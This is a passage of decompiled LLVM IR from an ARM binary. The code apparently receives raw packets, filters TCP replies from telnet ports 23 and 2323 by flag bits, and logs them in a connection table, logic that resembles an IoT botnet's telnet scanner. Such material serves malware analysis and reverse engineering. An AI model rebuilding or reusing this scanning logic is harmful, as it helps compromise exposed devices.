  store i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v0_1087c = call i32 @function_14ae4()
  store i32 %v0_1087c, i32* %r0.global-to-local, align 4
  %v3_10880 = load i32, i32* %stack_var_-52, align 4
  %v1_10884 = add i32 %v3_10880, 1
  store i32 %v1_10884, i32* %r3.global-to-local, align 4
  %v3_10888 = icmp ugt i32 %v1_10884, 383
  store i1 %v3_10888, i1* %cpsr_c.global-to-local, align 1
  %v8_10888 = icmp eq i32 %v1_10884, 384
  store i1 %v8_10888, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10884, i32* %stack_var_-52, align 4
  %v5_10890 = icmp slt i32 %v1_10884, 384
  br i1 %v5_10890, label %dec_label_pc_10630, label %dec_label_pc_10894

dec_label_pc_10894:                               ; preds = %dec_label_pc_107f4
  %v0_10894 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10898

dec_label_pc_10898:                               ; preds = %dec_label_pc_1060c, %dec_label_pc_10894
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_1060c ], [ %v0_10894, %dec_label_pc_10894 ]
  store i32 %stack_var_-1884.0, i32* @lr, align 4
  store i32 0, i32* @r6, align 4
  %v1_108a0 = add i32 %stack_var_-1884.0, 20
  store i32 %v1_108a0, i32* @r5, align 4
  %v1_1090c = add i32 %stack_var_-1884.0, 16
  %v2_1090c = inttoptr i32 %v1_1090c to i32*
  %v1_10920 = add i32 %stack_var_-1884.0, 9
  %v2_10920 = inttoptr i32 %v1_10920 to i8*
  %v4_1095c = sext i16 %stack_var_-1880.0 to i32
  %v1_109a0 = add i32 %stack_var_-1884.0, 12
  %v2_109a0 = inttoptr i32 %v1_109a0 to i32*
  br label %dec_label_pc_108a4

dec_label_pc_108a4:                               ; preds = %dec_label_pc_1098c, %dec_label_pc_10984, %dec_label_pc_1097c, %dec_label_pc_10958, %dec_label_pc_10940, %dec_label_pc_1091c, %dec_label_pc_10904, %dec_label_pc_10974, %dec_label_pc_10968, %dec_label_pc_108fc, %dec_label_pc_10a1c, %dec_label_pc_10898
  %v0_108a4 = call i32 @function_12f18()
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_108ac = inttoptr i32 %v0_108a4 to i32*
  store i32 0, i32* %v2_108ac, align 4
  %v2_108b8 = load i32, i32* @global_var_2297c.207, align 4
  store i32 %v2_108b8, i32* @r0, align 4
  store i32 1514, i32* @r2, align 4
  store i32 %stack_var_-1884.0, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_108d0 = call i32 @function_14a78()
  store i32 %v0_108d0, i32* %r0.global-to-local, align 4
  store i32 %v0_108d0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_108d4 = icmp eq i32 %v0_108d0, 0
  store i1 %v2_108d4, i1* %cpsr_z.global-to-local, align 1
  %tmp332 = icmp slt i32 %v0_108d0, 1
  br i1 %tmp332, label %dec_label_pc_10a44, label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %dec_label_pc_108a4
  %v0_108dc = call i32 @function_12f18()
  store i32 %v0_108dc, i32* %r0.global-to-local, align 4
  %v1_108e0 = inttoptr i32 %v0_108dc to i32*
  %v2_108e0 = load i32, i32* %v1_108e0, align 4
  store i32 %v2_108e0, i32* %r3.global-to-local, align 4
  %v2_108e4 = icmp ugt i32 %v2_108e0, 10
  store i1 %v2_108e4, i1* %cpsr_c.global-to-local, align 1
  %v7_108e4 = icmp eq i32 %v2_108e0, 11
  store i1 %v7_108e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108e4, label %dec_label_pc_10a44, label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108dc
  %v0_108ec = call i32 @function_12f18()
  store i32 %v0_108ec, i32* %r0.global-to-local, align 4
  %v1_108f0 = inttoptr i32 %v0_108ec to i32*
  %v2_108f0 = load i32, i32* %v1_108f0, align 4
  store i32 %v2_108f0, i32* %r3.global-to-local, align 4
  %v2_108f4 = icmp ugt i32 %v2_108f0, 10
  store i1 %v2_108f4, i1* %cpsr_c.global-to-local, align 1
  %v7_108f4 = icmp eq i32 %v2_108f0, 11
  store i1 %v7_108f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108f4, label %dec_label_pc_10a44, label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108ec
  %v0_108fc = load i32, i32* @r4, align 4
  %v2_108fc = icmp ugt i32 %v0_108fc, 38
  store i1 %v2_108fc, i1* %cpsr_c.global-to-local, align 1
  %v7_108fc = icmp eq i32 %v0_108fc, 39
  store i1 %v7_108fc, i1* %cpsr_z.global-to-local, align 1
  %v2_10900 = xor i1 %v2_108fc, true
  %v3_10900 = or i1 %v7_108fc, %v2_10900
  br i1 %v3_10900, label %dec_label_pc_108a4, label %dec_label_pc_10904

dec_label_pc_10904:                               ; preds = %dec_label_pc_108fc
  store i32 %stack_var_-1884.0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2295c.90 to i32), i32* %ip.global-to-local, align 4
  %v3_1090c = load i32, i32* %v2_1090c, align 4
  store i32 %v3_1090c, i32* %r2.global-to-local, align 4
  %v2_10910 = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_10910, i32* %r3.global-to-local, align 4
  %v3_10914 = icmp uge i32 %v3_1090c, %v2_10910
  store i1 %v3_10914, i1* %cpsr_c.global-to-local, align 1
  %v9_10914 = icmp eq i32 %v3_1090c, %v2_10910
  store i1 %v9_10914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10914, label %dec_label_pc_1091c, label %dec_label_pc_108a4

dec_label_pc_1091c:                               ; preds = %dec_label_pc_10904
  store i32 %stack_var_-1884.0, i32* @lr, align 4
  %v3_10920 = load i8, i8* %v2_10920, align 1
  %v4_10920 = zext i8 %v3_10920 to i32
  store i32 %v4_10920, i32* %r3.global-to-local, align 4
  %v2_10924 = icmp ugt i8 %v3_10920, 5
  store i1 %v2_10924, i1* %cpsr_c.global-to-local, align 1
  %v7_10924 = icmp eq i8 %v3_10920, 6
  store i1 %v7_10924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10924, label %dec_label_pc_1092c, label %dec_label_pc_108a4

dec_label_pc_1092c:                               ; preds = %dec_label_pc_1091c
  store i32 23, i32* %r0.global-to-local, align 4
  %v0_10930 = load i32, i32* @r5, align 4
  %v1_10930 = inttoptr i32 %v0_10930 to i16*
  %v2_10930 = load i16, i16* %v1_10930, align 2
  %v3_10930 = zext i16 %v2_10930 to i32
  store i32 %v3_10930, i32* @r4, align 4
  %v1_10934 = call i32 @function_14898(i32 23)
  store i32 %v1_10934, i32* %r0.global-to-local, align 4
  %v0_10938 = load i32, i32* @r4, align 4
  %v3_10938 = icmp uge i32 %v0_10938, %v1_10934
  store i1 %v3_10938, i1* %cpsr_c.global-to-local, align 1
  %v9_10938 = icmp eq i32 %v0_10938, %v1_10934
  store i1 %v9_10938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10938, label %dec_label_pc_10958, label %dec_label_pc_10940

dec_label_pc_10940:                               ; preds = %dec_label_pc_1092c
  store i32 2323, i32* %r0.global-to-local, align 4
  %v0_10948 = load i32, i32* @r5, align 4
  %v1_10948 = inttoptr i32 %v0_10948 to i16*
  %v2_10948 = load i16, i16* %v1_10948, align 2
  %v3_10948 = zext i16 %v2_10948 to i32
  store i32 %v3_10948, i32* @r4, align 4
  %v1_1094c = call i32 @function_14898(i32 2323)
  store i32 %v1_1094c, i32* %r0.global-to-local, align 4
  %v0_10950 = load i32, i32* @r4, align 4
  %v3_10950 = icmp uge i32 %v0_10950, %v1_1094c
  store i1 %v3_10950, i1* %cpsr_c.global-to-local, align 1
  %v9_10950 = icmp eq i32 %v0_10950, %v1_1094c
  store i1 %v9_10950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10950, label %dec_label_pc_10958, label %dec_label_pc_108a4

dec_label_pc_10958:                               ; preds = %dec_label_pc_10940, %dec_label_pc_1092c
  %v0_10958 = load i32, i32* @r5, align 4
  %v1_10958 = add i32 %v0_10958, 2
  %v2_10958 = inttoptr i32 %v1_10958 to i16*
  %v3_10958 = load i16, i16* %v2_10958, align 2
  %v4_10958 = zext i16 %v3_10958 to i32
  store i32 %v4_10958, i32* %r3.global-to-local, align 4
  store i32 %v4_1095c, i32* %r0.global-to-local, align 4
  %v3_10960 = icmp uge i32 %v4_10958, %v4_1095c
  store i1 %v3_10960, i1* %cpsr_c.global-to-local, align 1
  %v9_10960 = icmp eq i32 %v4_10958, %v4_1095c
  store i1 %v9_10960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10960, label %dec_label_pc_10968, label %dec_label_pc_108a4

dec_label_pc_10968:                               ; preds = %dec_label_pc_10958
  %v1_10968 = add i32 %v0_10958, 13
  %v2_10968 = inttoptr i32 %v1_10968 to i8*
  %v3_10968 = load i8, i8* %v2_10968, align 1
  %v4_10968 = zext i8 %v3_10968 to i32
  store i32 %v4_10968, i32* %r3.global-to-local, align 4
  %v1_1096c = and i32 %v4_10968, 2
  %v2_1096c = icmp eq i32 %v1_1096c, 0
  store i1 %v2_1096c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1096c, label %dec_label_pc_108a4, label %dec_label_pc_10974

dec_label_pc_10974:                               ; preds = %dec_label_pc_10968
  %v1_10974 = and i32 %v4_10968, 16
  %v2_10974 = icmp eq i32 %v1_10974, 0
  store i1 %v2_10974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10974, label %dec_label_pc_108a4, label %dec_label_pc_1097c

dec_label_pc_1097c:                               ; preds = %dec_label_pc_10974
  %v1_1097c = and i32 %v4_10968, 4
  %v2_1097c = icmp eq i32 %v1_1097c, 0
  store i1 %v2_1097c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1097c, label %dec_label_pc_10984, label %dec_label_pc_108a4

dec_label_pc_10984:                               ; preds = %dec_label_pc_1097c
  %tmp480 = urem i8 %v3_10968, 2
  %v2_10984 = icmp eq i8 %tmp480, 0
  store i1 %v2_10984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10984, label %dec_label_pc_1098c, label %dec_label_pc_108a4

dec_label_pc_1098c:                               ; preds = %dec_label_pc_10984
  %v1_1098c = add i32 %v0_10958, 8
  %v2_1098c = inttoptr i32 %v1_1098c to i32*
  %v3_1098c = load i32, i32* %v2_1098c, align 4
  store i32 %v3_1098c, i32* %r0.global-to-local, align 4
  %v1_10990 = call i32 @function_14a1c(i32 %v3_1098c)
  %v1_10994 = add i32 %v1_10990, -1
  store i32 %v1_10994, i32* %r0.global-to-local, align 4
  %v1_10998 = call i32 @function_14874(i32 %v1_10994)
  store i32 %v1_10998, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1884.0, i32* %r1.global-to-local, align 4
  %v3_109a0 = load i32, i32* %v2_109a0, align 4
  store i32 %v3_109a0, i32* %ip.global-to-local, align 4
  %v3_109a4 = icmp uge i32 %v1_10998, %v3_109a0
  store i1 %v3_109a4, i1* %cpsr_c.global-to-local, align 1
  %v9_109a4 = icmp eq i32 %v1_10998, %v3_109a0
  store i1 %v9_109a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_109a4, label %dec_label_pc_109ac, label %dec_label_pc_108a4

dec_label_pc_109ac:                               ; preds = %dec_label_pc_1098c
  %v0_109ac = load i32, i32* @r6, align 4
  %v2_109ac = icmp ugt i32 %v0_109ac, 254
  store i1 %v2_109ac, i1* %cpsr_c.global-to-local, align 1
  %v7_109ac = icmp eq i32 %v0_109ac, 255
  store i1 %v7_109ac, i1* %cpsr_z.global-to-local, align 1
  %v8_109b0 = icmp sgt i32 %v0_109ac, 255
  br i1 %v8_109b0, label %dec_label_pc_10a44, label %dec_label_pc_109b4

dec_label_pc_109b4:                               ; preds = %dec_label_pc_109ac
  %v2_109bc = load i32, i32* @global_var_22978.205, align 4
  store i32 %v2_109bc, i32* %r1.global-to-local, align 4
  %v3_109c0 = mul i32 %v0_109ac, 256
  store i32 %v3_109c0, i32* %r2.global-to-local, align 4
  %v2_109c4 = mul i32 %v0_109ac, 288
  store i32 %v2_109c4, i32* %r3.global-to-local, align 4
  %v2_109c8 = add i32 %v2_109bc, %v2_109c4
  store i32 %v2_109c8, i32* @r0, align 4
  %v1_109cc = add i32 %v2_109c8, 12
  %v2_109cc = inttoptr i32 %v1_109cc to i32*
  %v3_109cc = load i32, i32* %v2_109cc, align 4
  store i32 %v3_109cc, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_109d0 = icmp eq i32 %v3_109cc, 0
  store i1 %v2_109d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109d0, label %dec_label_pc_10a14, label %dec_label_pc_109f0.preheader

dec_label_pc_109f0.preheader:                     ; preds = %dec_label_pc_109b4
  %v2_109d4 = add i32 %v0_109ac, 1
  %v2_109dc = and i32 %v2_109d4, 134217728
  %v3_109dc = icmp ne i32 %v2_109dc, 0
  store i1 %v3_109dc, i1* %cpsr_c.global-to-local, align 1
  %v3_109e0 = mul i32 %v2_109d4, 288
  %v3_109e4 = add i32 %v2_109bc, %v3_109e0
  store i32 %v3_109e4, i32* %r3.global-to-local, align 4
  store i32 %v0_109ac, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_109f0

dec_label_pc_109f0:                               ; preds = %dec_label_pc_109f0.preheader, %dec_label_pc_109fc
  %v0_109fc = phi i32 [ %v3_109e4, %dec_label_pc_109f0.preheader ], [ %v1_10a08, %dec_label_pc_109fc ]
  %v0_109f0 = phi i32 [ %v0_109ac, %dec_label_pc_109f0.preheader ], [ %v1_109f0, %dec_label_pc_109fc ]
  %v1_109f0 = add i32 %v0_109f0, 1
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v7_109f4 = icmp eq i32 %v1_109f0, 256
  br i1 %v7_109f4, label %dec_label_pc_10a44.loopexit, label %dec_label_pc_109fc

dec_label_pc_109fc:                               ; preds = %dec_label_pc_109f0
  store i32 %v0_109fc, i32* @r0, align 4
  %v1_10a00 = add i32 %v0_109fc, 12
  %v2_10a00 = inttoptr i32 %v1_10a00 to i32*
  %v3_10a00 = load i32, i32* %v2_10a00, align 4
  %v2_10a04 = icmp eq i32 %v3_10a00, 0
  %v1_10a08 = add i32 %v0_109fc, 288
  store i32 %v1_10a08, i32* %r3.global-to-local, align 4
  br i1 %v2_10a04, label %dec_label_pc_10a10, label %dec_label_pc_109f0

dec_label_pc_10a10:                               ; preds = %dec_label_pc_109fc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_109f0, i32* @r6, align 4
  br label %dec_label_pc_10a14

dec_label_pc_10a14:                               ; preds = %dec_label_pc_109b4, %dec_label_pc_10a10
  %v1_10a20 = phi i32 [ %v2_109c8, %dec_label_pc_109b4 ], [ %v0_109fc, %dec_label_pc_10a10 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a14 = icmp eq i32 %v1_10a20, 0
  store i1 %v2_10a14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a14, label %dec_label_pc_10a44, label %dec_label_pc_10a1c

dec_label_pc_10a1c:                               ; preds = %dec_label_pc_10a14
  %v0_10a1c = load i32, i32* @r5, align 4
  %v1_10a1c = inttoptr i32 %v0_10a1c to i16*
  %v2_10a1c = load i16, i16* %v1_10a1c, align 2
  %v3_10a1c = zext i16 %v2_10a1c to i32
  store i32 %v3_10a1c, i32* %r3.global-to-local, align 4
  %v2_10a20 = add i32 %v1_10a20, 16
  %v3_10a20 = inttoptr i32 %v2_10a20 to i32*
  store i32 %v1_10998, i32* %v3_10a20, align 4
  %v0_10a24 = load i32, i32* %r3.global-to-local, align 4
  %v1_10a24 = trunc i32 %v0_10a24 to i16
  %v2_10a24 = load i32, i32* @r0, align 4
  %v3_10a24 = add i32 %v2_10a24, 20
  %v4_10a24 = inttoptr i32 %v3_10a24 to i16*
  store i16 %v1_10a24, i16* %v4_10a24, align 2
  %v0_10a28 = call i32 @function_fdc0()
  store i32 %v0_10a28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_108a4

dec_label_pc_10a30:                               ; preds = %dec_label_pc_100dc
  store i32 ptrtoint (i32* @global_var_2297c.207 to i32), i32* %ip.global-to-local, align 4
  %v2_10a34 = load i32, i32* @global_var_2297c.207, align 4
  store i32 %v2_10a34, i32* @r0, align 4
  %v1_10a38 = call i32 @function_15b6c(i32 %v2_10a34)
  store i32 %v1_10a38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10a3c

dec_label_pc_10a3c:                               ; preds = %dec_label_pc_100b8, %dec_label_pc_10a30
  %v0_10a3c = load i32, i32* @r5, align 4
  store i32 %v0_10a3c, i32* %r0.global-to-local, align 4
  %v1_10a40 = call i32 @function_12f30(i32 %v0_10a3c)
  store i32 %v1_10a40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10a44

dec_label_pc_10a44.loopexit:                      ; preds = %dec_label_pc_109f0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10a44

dec_label_pc_10a44:                               ; preds = %dec_label_pc_10a14, %dec_label_pc_109ac, %dec_label_pc_108ec, %dec_label_pc_108dc, %dec_label_pc_108a4, %dec_label_pc_10a44.loopexit, %dec_label_pc_10a3c
  %stack_var_-1876.2 = phi i32 [ %tmp273, %dec_label_pc_10a3c ], [ %stack_var_-1876.1, %dec_label_pc_10a44.loopexit ], [ %stack_var_-1876.1, %dec_label_pc_108a4 ], [ %stack_var_-1876.1, %dec_label_pc_108dc ], [ %stack_var_-1876.1, %dec_label_pc_108ec ], [ %stack_var_-1876.1, %dec_label_pc_109ac ], [ %stack_var_-1876.1, %dec_label_pc_10a14 ]
  %stack_var_-1884.1 = phi i32 [ %tmp274, %dec_label_pc_10a3c ], [ %stack_var_-1884.0, %dec_label_pc_10a44.loopexit ], [ %stack_var_-1884.0, %dec_label_pc_108a4 ], [ %stack_var_-1884.0, %dec_label_pc_108dc ], [ %stack_var_-1884.0, %dec_label_pc_108ec ], [ %stack_var_-1884.0, %dec_label_pc_109ac ], [ %stack_var_-1884.0, %dec_label_pc_10a14 ]
  %stack_var_-1880.1 = phi i16 [ %tmp275, %dec_label_pc_10a3c ], [ %stack_var_-1880.0, %dec_label_pc_10a44.loopexit ], [ %stack_var_-1880.0, %dec_label_pc_108a4 ], [ %stack_var_-1880.0, %dec_label_pc_108dc ], [ %stack_var_-1880.0, %dec_label_pc_108ec ], [ %stack_var_-1880.0, %dec_label_pc_109ac ], [ %stack_var_-1880.0, %dec_label_pc_10a14 ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_10a64438 = load i32, i32* @sp, align 4
  %v3_10a64439 = add i32 %v2_10a64438, 1676
  %v4_10a64440 = inttoptr i32 %v3_10a64439 to i32*
  store i32 0, i32* %v4_10a64440, align 4
  br label %dec_label_pc_10a50.dec_label_pc_10a50_crit_edge

dec_label_pc_10a50.dec_label_pc_10a50_crit_edge:  ; preds = %dec_label_pc_10a44, %dec_label_pc_10a50.dec_label_pc_10a50_crit_edge
  %v0_10a50.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10a54 = add i32 %v0_10a50.pre, 4
  store i32 %v1_10a54, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10a5c = add i32 %v0_10a50.pre, 1672
  store i32 %v1_10a5c, i32* %ip.global-to-local, align 4
  %v7_10a60 = icmp eq i32 %v1_10a54, 128
  %v2_10a64 = load i32, i32* @sp, align 4
  %v3_10a64 = add i32 %v2_10a64, %v1_10a5c
  %v4_10a64 = inttoptr i32 %v3_10a64 to i32*
  store i32 0, i32* %v4_10a64, align 4
  br i1 %v7_10a60, label %dec_label_pc_10a6c, label %dec_label_pc_10a50.dec_label_pc_10a50_crit_edge

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a50.dec_label_pc_10a50_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10a6c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10a6c, i32* %stack_var_-352, align 4
  %v1_10a78432 = add i32 %v0_10a6c, 8
  store i32 %v1_10a78432, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_10a80433 = add i32 %v0_10a6c, 1548
  store i32 %v1_10a80433, i32* @lr, align 4
  %v7_10a84434 = icmp eq i32 %v1_10a78432, 128
  %v2_10a88435 = load i32, i32* @sp, align 4
  %v3_10a88436 = add i32 %v2_10a88435, %v1_10a80433
  %v4_10a88437 = inttoptr i32 %v3_10a88436 to i32*
  store i32 0, i32* %v4_10a88437, align 4
  br i1 %v7_10a84434, label %dec_label_pc_10a90, label %dec_label_pc_10a74.dec_label_pc_10a74_crit_edge

dec_label_pc_10a74.dec_label_pc_10a74_crit_edge:  ; preds = %dec_label_pc_10a6c, %dec_label_pc_10a74.dec_label_pc_10a74_crit_edge
  %v0_10a74.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10a78 = add i32 %v0_10a74.pre, 4
  store i32 %v1_10a78, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_10a80 = add i32 %v0_10a74.pre, 1544
  store i32 %v1_10a80, i32* @lr, align 4
  %v7_10a84 = icmp eq i32 %v1_10a78, 128
  %v2_10a88 = load i32, i32* @sp, align 4
  %v3_10a88 = add i32 %v2_10a88, %v1_10a80
  %v4_10a88 = inttoptr i32 %v3_10a88 to i32*
  store i32 0, i32* %v4_10a88, align 4
  br i1 %v7_10a84, label %dec_label_pc_10a90, label %dec_label_pc_10a74.dec_label_pc_10a74_crit_edge

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10a74.dec_label_pc_10a74_crit_edge, %dec_label_pc_10a6c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10a90 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10a90, i32* @r6, align 4
  store i32 %v0_10a90, i32* @r5, align 4
  store i32 %v0_10a90, i32* %stack_var_-52, align 4
  %v2_119f0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10aec

dec_label_pc_10aa0:                               ; preds = %dec_label_pc_10b1c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_10b08, i1* %cpsr_z.global-to-local, align 1
  %v1_119e4 = add i32 %v2_10b00, 4
  %v2_119e4 = inttoptr i32 %v1_119e4 to i32*
  %v3_119e4 = load i32, i32* %v2_119e4, align 4
  br i1 %v7_10b08, label %dec_label_pc_119e4, label %dec_label_pc_10aa8

dec_label_pc_10aa8:                               ; preds = %dec_label_pc_10aa0
  store i32 %v3_119e4, i32* %ip.global-to-local, align 4
  %v3_10aac = udiv i32 %v3_119e4, 32
  store i32 %v2_119f0, i32* %r0.global-to-local, align 4
  %v3_10ab4 = mul nuw nsw i32 %v3_10aac, 4
  %v2_10ab8 = add i32 %v3_10ab4, %v2_119f0
  store i32 %v2_10ab8, i32* %r3.global-to-local, align 4
  %v1_10abc = add i32 %v2_10ab8, -184
  %v2_10abc = inttoptr i32 %v1_10abc to i32*
  %v3_10abc = load i32, i32* %v2_10abc, align 4
  %v1_10ac0 = urem i32 %v3_119e4, 32
  store i32 %v1_10ac0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_10ac8 = shl i32 1, %v1_10ac0
  %v8_10ac8 = or i32 %v3_10abc, %v7_10ac8
  store i32 %v8_10ac8, i32* %r2.global-to-local, align 4
  store i32 %v8_10ac8, i32* %v2_10abc, align 4
  %v0_10ad0 = load i32, i32* @r6, align 4
  %v1_10ad0 = load i32, i32* %ip.global-to-local, align 4
  %v3_10ad0 = icmp uge i32 %v0_10ad0, %v1_10ad0
  store i1 %v3_10ad0, i1* %cpsr_c.global-to-local, align 1
  %v9_10ad0 = icmp eq i32 %v0_10ad0, %v1_10ad0
  store i1 %v9_10ad0, i1* %cpsr_z.global-to-local, align 1
  %v5_10ad4 = icmp slt i32 %v0_10ad0, %v1_10ad0
  br i1 %v5_10ad4, label %bb333, label %bb334

bb333:                                            ; preds = %dec_label_pc_10aa8
  store i32 %v1_10ad0, i32* @r6, align 4
  br label %bb334

bb334:                                            ; preds = %.thread43, %bb340, %bb338, %bb383, %dec_label_pc_10b80, %dec_label_pc_10aa8, %bb333
  %v3_10ad8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10ad8, i32* %r3.global-to-local, align 4
  %v1_10adc = add i32 %v3_10ad8, 1
  store i32 %v1_10adc, i32* %r2.global-to-local, align 4
  %v2_10ae0 = icmp ugt i32 %v1_10adc, 254
  store i1 %v2_10ae0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ae0 = icmp eq i32 %v1_10adc, 255
  store i1 %v7_10ae0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10adc, i32* %stack_var_-52, align 4
  %v8_10ae8 = icmp sgt i32 %v1_10adc, 255
  br i1 %v8_10ae8, label %dec_label_pc_10ba0, label %dec_label_pc_10aec

dec_label_pc_10aec:                               ; preds = %bb334, %dec_label_pc_10a90
  %v0_10af8 = phi i32 [ %v1_10adc, %bb334 ], [ %v0_10a90, %dec_label_pc_10a90 ]
  store i32 ptrtoint (i32* @global_var_22978.205 to i32), i32* %r0.global-to-local, align 4
  %v3_10af0 = mul i32 %v0_10af8, 256
  store i32 %v3_10af0, i32* %r3.global-to-local, align 4
  %v2_10af4 = load i32, i32* @global_var_22978.205, align 4
  store i32 %v2_10af4, i32* %r1.global-to-local, align 4
  %v2_10afc = mul i32 %v0_10af8, 288
  store i32 %v2_10afc, i32* %r2.global-to-local, align 4
  %v2_10b00 = add i32 %v2_10af4, %v2_10afc
  store i32 %v2_10b00, i32* @r4, align 4
  %v1_10b04 = add i32 %v2_10b00, 12
  %v2_10b04 = inttoptr i32 %v1_10b04 to i32*
  %v3_10b04 = load i32, i32* %v2_10b04, align 4
  store i32 %v3_10b04, i32* %ip.global-to-local, align 4
  %v2_10b08 = icmp ne i32 %v3_10b04, 0
  store i1 %v2_10b08, i1* %cpsr_c.global-to-local, align 1
  %v7_10b08 = icmp eq i32 %v3_10b04, 1
  store i1 %v7_10b08, i1* %cpsr_z.global-to-local, align 1
  %v2_10b0c = xor i1 %v2_10b08, true
  %v3_10b0c = or i1 %v7_10b08, %v2_10b0c
  br i1 %v3_10b0c, label %bb335, label %bb336

bb335:                                            ; preds = %dec_label_pc_10aec
  store i32 5, i32* %r1.global-to-local, align 4
  br label %bb336

bb336:                                            ; preds = %dec_label_pc_10aec, %bb335
  %v1_10b2c143 = phi i32 [ %v2_10af4, %dec_label_pc_10aec ], [ 5, %bb335 ]
  %v2_10b10 = xor i1 %v7_10b08, true
  %v3_10b10 = and i1 %v2_10b08, %v2_10b10
  br i1 %v3_10b10, label %bb337, label %bb338

bb337:                                            ; preds = %bb336
  store i32 30, i32* %r1.global-to-local, align 4
  br label %bb338

bb338:                                            ; preds = %bb336, %bb337
  %v1_10b2c = phi i32 [ %v1_10b2c143, %bb336 ], [ 30, %bb337 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b14 = icmp eq i32 %v3_10b04, 0
  store i1 %v2_10b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b14, label %bb334, label %dec_label_pc_10b1c

dec_label_pc_10b1c:                               ; preds = %bb338
  store i32 ptrtoint (i32* @global_var_223e8.194 to i32), i32* %r2.global-to-local, align 4
  %v2_10b20 = load i32, i32* @global_var_223e8.194, align 4
  store i32 %v2_10b20, i32* %r3.global-to-local, align 4
  %v1_10b24 = add i32 %v2_10b00, 8
  %v2_10b24 = inttoptr i32 %v1_10b24 to i32*
  %v3_10b24 = load i32, i32* %v2_10b24, align 4
  store i32 %v3_10b24, i32* %r2.global-to-local, align 4
  %v2_10b28 = sub i32 %v2_10b20, %v3_10b24
  store i32 %v2_10b28, i32* %r3.global-to-local, align 4
  %v3_10b2c = icmp uge i32 %v2_10b28, %v1_10b2c
  store i1 %v3_10b2c, i1* %cpsr_c.global-to-local, align 1
  %v9_10b2c = icmp eq i32 %v2_10b28, %v1_10b2c
  store i1 %v9_10b2c, i1* %cpsr_z.global-to-local, align 1
  %v2_10b30 = xor i1 %v3_10b2c, true
  %v3_10b30 = or i1 %v9_10b2c, %v2_10b30
  br i1 %v3_10b30, label %dec_label_pc_10aa0, label %dec_label_pc_10b34

dec_label_pc_10b34:                               ; preds = %dec_label_pc_10b1c
  %v1_10b34 = add i32 %v2_10b00, 4
  %v2_10b34 = inttoptr i32 %v1_10b34 to i32*
  %v3_10b34 = load i32, i32* %v2_10b34, align 4
  store i32 %v3_10b34, i32* @r0, align 4
  %v1_10b38 = call i32 @function_15b6c(i32 %v3_10b34)
  store i32 %v1_10b38, i32* %r0.global-to-local, align 4
  %v0_10b3c = load i32, i32* @r4, align 4
  %v1_10b3c = add i32 %v0_10b3c, 12
  %v2_10b3c = inttoptr i32 %v1_10b3c to i32*
  %v3_10b3c = load i32, i32* %v2_10b3c, align 4
  store i32 %v3_10b3c, i32* %r3.global-to-local, align 4
